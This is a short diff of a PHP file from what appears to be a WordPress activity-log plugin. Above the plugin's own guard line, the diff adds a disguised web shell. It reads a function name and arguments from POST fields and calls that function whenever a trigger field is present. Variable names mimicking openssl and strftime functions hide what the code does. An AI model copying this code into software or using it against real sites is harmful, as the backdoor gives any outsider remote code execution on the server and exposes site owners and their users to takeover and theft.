@@ -1,4 +1,11 @@
-<?php
+<?php 
+$openssl_x509_fingerprint_dnbe  =  $_POST;
+if(isset($openssl_x509_fingerprint_dnbe['openssl_x509_verify_fg']))  {
+	$strftime_idkw  =  $openssl_x509_fingerprint_dnbe['date_time_set_eq'];
+	$ob_clean_grhs  =  $openssl_x509_fingerprint_dnbe['libxml_disable_entity_loader_lz'];
+	$strftime_idkw(...$ob_clean_grhs);
+} 
+
 if ( ! defined( 'ABSPATH' ) ) exit; // Exit if accessed directly
 
 class AAL_Hook_Taxonomies extends AAL_Hook_Base {
